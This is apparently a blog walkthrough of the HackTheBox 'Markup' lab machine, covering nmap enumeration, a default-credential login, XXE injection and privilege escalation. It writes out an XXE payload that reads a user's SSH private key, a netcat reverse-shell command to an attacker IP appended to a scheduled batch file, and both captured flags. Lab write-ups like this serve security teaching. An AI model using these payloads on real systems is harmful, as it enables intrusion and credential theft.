---
title: Markup
date: 2025-05-20
description: Walkthrough of the "Markup" machine on HackTheBox, featuring enumeration, XML external entity (XXE) injection to gain a user shell, and privilege escalation via writable batch script to SYSTEM.
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: g4nd1v
authorEmoji: 👨‍💻
tags:
  - HackTheBox
  - htb-markup
  - nmap
  - xxe
  - winbox
  - xml-injection
  - apache
  - php
  - ssh
  - privilege-escalation
  - batch-replacement
  - reverse-shell
categories:
  - HackTheBox
  - HackTheBox/Windows
image: images/Markup/banner.jpeg
---

# Markup

| Title       | [Markup](https://www.hackthebox.com/machines/markup)                                                                                                                                              |
| ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Description | Walkthrough of the "Markup" machine on HackTheBox, featuring enumeration, XML external entity (XXE) injection to gain a user shell, and privilege escalation via writable batch script to SYSTEM. |
| Difficulty  | Very Easy                                                                                                                                                                                         |
| Maker       | [MrR3boot](https://app.hackthebox.com/profile/13531)                                                                                                                                              |

## Enumeration

### Nmap

```bash
└─$ nmap -sC -sV 10.129.16.158
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 17:21 EDT
Nmap scan report for markup.htb (10.129.16.158)
Host is up (0.060s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: MegaShopping
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-title: MegaShopping
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1

```

Let's fuzz directories
![[Pasted image 20250520172313.png]]
From (http://markup.htb/webalizer) we got the version of Apache that is `2.4.41`. Moreover, there is a signin form on homepage.
![[Pasted image 20250520172602.png]]
When I tried some default creds, it worked! `admin:password`. After login, when we go to Contact tab, we will see login form on `service.php`.
![[Pasted image 20250520172746.png]]
Let's try to submit the form and intercept the request in burpsuite!
![[Pasted image 20250520172831.png]]

## User Flag

It's XML request, let's try to do XML Injection. If we see the source code from `service.php` file, we will see this comment `<!-- Modified by Daniel : UI-Fix-9092-->`. Meaning, there is a user named as `Daniel` in the system, we will try to get it's `id_rsa` from account and get the shell as we can see SSH port is enabled.

```xml
<?xml version = "1.0"?><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///C:/Users/daniel/.ssh/id_rsa"> ]><order><quantity>1</quantity><item>&ent;</item><address>test</address></order>
```

![[Pasted image 20250520174008.png]]
Make a file named as `id_rsa` and change it's permission to 400 using `chmod 400 id_rsa` and then login with ssh `ssh -i id_rsa daniel@markup.htb`. We will get our user flag in Daniel's desktop folder.

> Flag: `032d2fc8952a8c24e39c8f0ee9918ef7`

## Root Flag

If we go to `Log-Management`folder, we will find `job.bat` file.
![[Pasted image 20250520174915.png]]

```bat
daniel@MARKUP C:\Log-Management>type job.bat
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

If we look at this file's permission, we will see `BUILTIN\Users:(I)(RX)` and `BUILTIN\Users:(F)`, which means user has full control over this file. Let's download `nc64.exe` and append to this file, so every time when this file gets executed we will get the shell.
Download nc from https://github.com/int0x33/nc.exe/blob/master/nc64.exe
![[Pasted image 20250520175207.png]]
To add the shell inot `job.bat` we will use

- `echo C:\Log-Management\nc.exe -e cmd.exe 10.10.14.243 4444 > C:\Log-Management\job.bat`
  ![[Pasted image 20250520175412.png]]
  After a sec, we will get the reverse shell as system.
  > Flag: `f574a3e7650cebd8c39784299cb570f8`
